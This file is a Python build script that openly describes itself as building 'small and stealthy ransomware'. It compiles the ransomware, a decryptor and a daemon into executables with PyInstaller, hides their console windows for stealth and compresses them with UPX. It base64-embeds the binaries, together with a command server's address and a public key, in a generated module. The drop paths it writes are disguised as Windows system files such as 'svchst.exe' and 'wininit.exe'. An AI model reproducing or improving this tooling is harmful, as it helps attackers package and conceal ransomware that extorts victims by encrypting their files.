#!/usr/bin/env python

import argparse
import base64
import os
import sys
import shutil
import subprocess
import tempfile

parser = argparse.ArgumentParser(description='Build small and stealthy ransomware.', add_help=True)
parser.add_argument('-i', '--ip', type=str, required=False, metavar='[IP]',
    help='IP address of the server.')
parser.add_argument('-p', '--port', type=str, required=False, metavar='[PORT]',
    help='Port of the server.')
parser.add_argument('-I', '--img', type=str, required=False, metavar='[IMAGE]',
    help='Path to image file to use as ransomware wallpaper')
parser.add_argument('-o', '--output', type=str, required=False, default='output',
    help='Output directory for built files')
args = parser.parse_args()

# Create output directory if it doesn't exist
if not os.path.exists(args.output):
    os.makedirs(args.output)

def error(s):
    """Print error and exit"""
    print(f"ERROR: {s}")
    sys.exit(1)

def info(s):
    """Print info message"""
    print(f"[+] {s}")

def install_requirements():
    """Install required packages"""
    info("Installing required packages...")
    required_packages = [
        "pyinstaller",
        "cryptography",
        "requests",
        "pillow",  # For wallpaper manipulation
        "pywin32",  # For Windows API access
    ]
    
    for package in required_packages:
        info(f"Installing {package}...")
        try:
            subprocess.run(
                [sys.executable, "-m", "pip", "install", "--upgrade", package],
                capture_output=True,
                text=True,
                check=True
            )
            info(f"Successfully installed {package}")
        except subprocess.CalledProcessError as e:
            print(f"Error installing {package}: {e}")
            response = input(f"Continue despite {package} installation failure? (y/n): ")
            if response.lower() != 'y':
                sys.exit(1)

def normalize_path(path):
    """Normalize path to handle special characters"""
    return os.path.normpath(os.path.abspath(path))

def find_script(program_name):
    """Find script file location"""
    project_dir = os.getcwd()
    possible_locations = [
        os.path.join(project_dir, f"{program_name}.py"),
        os.path.join(project_dir, "Ransomware", f"{program_name}.py"),
        os.path.join(os.path.dirname(project_dir), f"{program_name}.py"),
        os.path.join(os.path.dirname(project_dir), "Ransomware", f"{program_name}.py")
    ]
    
    for location in possible_locations:
        norm_path = normalize_path(location)
        if os.path.exists(norm_path):
            info(f"Found {program_name}.py at: {norm_path}")
            return norm_path
            
    error(f"Script {program_name}.py not found")
    return None

def copy_to_temp(file_path):
    """Copy file to temp directory to avoid path issues"""
    temp_dir = tempfile.mkdtemp()
    file_name = os.path.basename(file_path)
    temp_path = os.path.join(temp_dir, file_name)
    
    try:
        shutil.copy2(file_path, temp_path)
        info(f"Copied {file_path} to {temp_path}")
        return temp_path
    except Exception as e:
        error(f"Failed to copy file to temp directory: {e}")
        return None

def build_executable(script_path, program_name, icon_path=None):
    """Build executable from Python script"""
    info(f"Building {program_name}...")
    
    # Use temp file to avoid path issues
    temp_script = copy_to_temp(script_path)
    if not temp_script:
        error(f"Failed to prepare {program_name}.py for building")
    
    # Output path in specified output directory
    output_dir = normalize_path(args.output)
    output_path = os.path.join(output_dir, f"{program_name}.exe")
    
    # Base PyInstaller arguments
    pyinstaller_args = [
        sys.executable, "-m", "PyInstaller",
        "--clean",
        "--onefile",
        temp_script,
        "--name", program_name,
        "--distpath", output_dir,
        "--specpath", tempfile.mkdtemp(),  # Use temp dir for spec file
        "--log-level", "INFO"
    ]

    # Add --noconsole option only for non-decryptor executables
    if program_name != "decryptor":
        pyinstaller_args.append("--noconsole")  # No console window for stealth
    
    # Add UPX compression if available
    upx_dirs = [
        ".",
        "./tools",
        "./bin",
        os.path.join(os.path.expanduser("~"), "bin")
    ]
    
    for upx_dir in upx_dirs:
        if os.path.exists(os.path.join(upx_dir, "upx.exe")) or os.path.exists(os.path.join(upx_dir, "upx")):
            pyinstaller_args.extend(["--upx-dir", upx_dir])
            info("UPX found and will be used for compression")
            break
    
    # Add icon if provided
    if icon_path and os.path.exists(icon_path):
        pyinstaller_args.extend(["--icon", icon_path])
    
    # Add required imports based on program type
    if program_name == "main":
        # Main ransomware component needs these imports
        pyinstaller_args.extend([
            "--hidden-import", "cryptography.hazmat.backends.openssl",
            "--hidden-import", "cryptography.hazmat.primitives.asymmetric.rsa",
            "--hidden-import", "cryptography.hazmat.primitives.serialization",
            "--hidden-import", "win32api",
            "--hidden-import", "win32con"
        ])
    elif program_name == "decryptor":
        # Add any specific imports needed for decryptor
        pyinstaller_args.extend([
            "--hidden-import", "cryptography.hazmat.backends.openssl",
            "--hidden-import", "cryptography.hazmat.primitives.asymmetric.rsa",
            "--hidden-import", "cryptography.hazmat.primitives.serialization",
        ])
    elif program_name == "daemon":
        # Add any specific imports needed for daemon
        pyinstaller_args.extend([
            "--hidden-import", "win32api",
            "--hidden-import", "win32con"
        ])
    
    try:
        info(f"Running PyInstaller with args: {' '.join(pyinstaller_args)}")
        result = subprocess.run(
            pyinstaller_args,
            check=True,
            capture_output=True,
            text=True
        )
        
        if not os.path.exists(output_path):
            info("PyInstaller output:")
            print(result.stdout)
            print(result.stderr)
            error(f"Failed to build {program_name} - output file not found")
        
        # Read and encode the binary
        with open(output_path, 'rb') as f:
            binary_data = f.read()
        
        # Check if file size is reasonable
        file_size_mb = len(binary_data) / (1024 * 1024)
        info(f"{program_name}.exe size: {file_size_mb:.2f} MB")
        
        # Base64 encode
        output64 = base64.b64encode(binary_data)
        
        # Write base64 to file
        b64_path = os.path.join(output_dir, f"{program_name}_b64.txt")
        with open(b64_path, 'wb') as f:
            f.write(output64)
        
        info(f"Successfully built {program_name}")
        return output64
        
    except subprocess.CalledProcessError as e:
        print("PyInstaller error:", e)
        print("STDOUT:", e.stdout)
        print("STDERR:", e.stderr)
        error(f"Failed to build {program_name}")
    except Exception as e:
        error(f"Error building {program_name}: {e}")
    finally:
        # Clean up temp directory
        try:
            shutil.rmtree(os.path.dirname(temp_script))
        except:
            pass
    
    return None

def build_component_executables():
    """Build executables from existing component files"""
    info("Building component executables from existing files...")
    
    # Find script files
    decryptor_script = find_script("decryptor")
    daemon_script = find_script("daemon")
    
    if not decryptor_script:
        error("decryptor.py not found - cannot continue")
    
    if not daemon_script:
        error("daemon.py not found - cannot continue")
    
    # Build executables
    decryptor_b64 = build_executable(decryptor_script, "decryptor")
    daemon_b64 = build_executable(daemon_script, "daemon")
    
    if not decryptor_b64 or not daemon_b64:
        error("Failed to build component executables")
    
    return decryptor_b64, daemon_b64

def create_variables_module(main_b64, decryptor_b64, daemon_b64, img_b64=None):
    """Create variables.py module with embedded executables"""
    info("Creating variables.py module...")
    
    # Output directory
    output_dir = normalize_path(args.output)
    variables_path = os.path.join(output_dir, "variables.py")
    
    # Create content
    content = f"""# Auto-generated variables module
# Contains encoded binaries and configuration

# Server information
server_ip = "{args.ip if args.ip else '127.0.0.1'}"
server_port = "{args.port if args.port else '8443'}"

# Server public key - Replace with actual key
server_public_key = \"""-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAzaDRl/3sBU4A5IVvBgmC
0eNZ4adZrdpU9JBbNKR+Z0XAXRDwwH8TlFfFRxLlwFqRB71TP9Wnt2PykcQ2OiXj
zR4/xQbKY5Vy6RYaaExWXSJK5yp6LBJNHfzZ50hXMdJINyTvPX/0Y9ZdJfGJwPif
7kWRF+YOUbpUIjQpWxcvxJMmY1Na1O6Fm++NKs3jV/n6SLjO0CUkmGu7lrZW0gCW
OKtHlOHgnvKHniy7rKBM3VnzGPveDYf8pBPcAQ+TuGKARYLL6pDJV1Kt3xLCN4N8
LH2jkP/7HiqYETwx9HKrIkQxnUz+g9qUF7EWdbPzJ9Bj8QUGSMcuzIBuvfOyWxMG
zwIDAQAB
-----END PUBLIC KEY-----\"""

# Paths
app_data = os.path.join(os.environ.get('APPDATA', ''), 'System')
ransomware_path = os.path.join(app_data, 'Cache')
encrypted_client_private_key_path = os.path.join(ransomware_path, 'client_private.key')
client_public_key_path = os.path.join(ransomware_path, 'client_public.key')
aes_encrypted_keys_path = os.path.join(ransomware_path, 'file_keys.dat')
decryptor_path = os.path.join(os.environ.get('TEMP', ''), 'svchst.exe')
daemon_path = os.path.join(os.environ.get('TEMP', ''), 'wininit.exe')

# Encoded executables
Z434M4 = b\"""{main_b64.decode('utf-8')}\"\"\"
decryptor = b\"""{decryptor_b64.decode('utf-8')}\"\"\"
daemon = b\"""{daemon_b64.decode('utf-8')}\"\"\"
"""

    # Add image if provided
    if img_b64:
        content += f"img = b\"""{img_b64.decode('utf-8')}\"\"\"\n"
    else:
        content += "img = None\n"
    
    # Write to file
    with open(variables_path, 'w') as f:
        f.write(content)
    
    info(f"Variables module created at {variables_path}")
    return variables_path

def encode_image(image_path=None):
    """Encode image to base64"""
    if not image_path and args.img:
        image_path = args.img
    
    if not image_path or not os.path.exists(image_path):
        info("No valid image path provided - skipping wallpaper feature")
        return None
    
    try:
        info(f"Encoding image {image_path} to base64...")
        with open(image_path, 'rb') as f:
            img_data = f.read()
        return base64.b64encode(img_data)
    except Exception as e:
        info(f"Error encoding image: {e}")
        return None

def clean_build_artifacts():
    """Clean up build artifacts"""
    info("Cleaning build artifacts...")
    
    # Directories to clean
    dirs_to_clean = ['build', '__pycache__', 'dist']
    
    for directory in dirs_to_clean:
        if os.path.exists(directory):
            try:
                shutil.rmtree(directory)
                info(f"Removed {directory}")
            except Exception as e:
                info(f"Error removing {directory}: {e}")
    
    # Remove .spec files
    for file in os.listdir():
        if file.endswith('.spec'):
            try:
                os.remove(file)
                info(f"Removed {file}")
            except Exception as e:
                info(f"Error removing {file}: {e}")

def create_combined_executable():
    """Create a single executable combining all components"""
    info("Creating optimized single executable...")
    
    # Get optimized main.py path
    main_script = find_script("main")
    if not main_script:
        # Try to find the artifact we created earlier
        if os.path.exists("main.py"):
            main_script = "main.py"
        else:
            error("Could not find main.py")
    
    # Build the executable
    main_b64 = build_executable(main_script, "ransomware")
    
    if not main_b64:
        error("Failed to build optimized executable")
    
    return main_b64

def main():
    print("\n========================================")
    print("   Optimized Build System")
    print("========================================\n")
    
    # Install requirements
    install_requirements()
    
    # Build component executables from existing files
    info("Building component executables from your existing files...")
    decryptor_b64, daemon_b64 = build_component_executables()
    
    # Encode image if provided
    img_b64 = encode_image()
    
    # Create optimized single executable
    info("Creating optimized main executable...")
    main_b64 = create_combined_executable()
    
    # Create variables module
    variables_path = create_variables_module(main_b64, decryptor_b64, daemon_b64, img_b64)
    
    # Clean build artifacts
    clean_build_artifacts()
    
    print("\n========================================")
    print("   Build Complete")
    print("========================================")
    print(f"Output files in: {normalize_path(args.output)}")
    print("\nFinal file sizes:")
    
    # Calculate and display sizes
    output_dir = normalize_path(args.output)
    ransomware_path = os.path.join(output_dir, "ransomware.exe")
    if os.path.exists(ransomware_path):
        size_mb = os.path.getsize(ransomware_path) / (1024 * 1024)
        print(f"Main executable:    {size_mb:.2f} MB")
    
    decryptor_path = os.path.join(output_dir, "decryptor.exe")
    if os.path.exists(decryptor_path):
        size_mb = os.path.getsize(decryptor_path) / (1024 * 1024)
        print(f"Decryptor:          {size_mb:.2f} MB")
    
    daemon_path = os.path.join(output_dir, "daemon.exe")
    if os.path.exists(daemon_path):
        size_mb = os.path.getsize(daemon_path) / (1024 * 1024)
        print(f"Daemon:             {size_mb:.2f} MB")
    
    print("\nBuild succeeded!")

if __name__ == "__main__":
    main()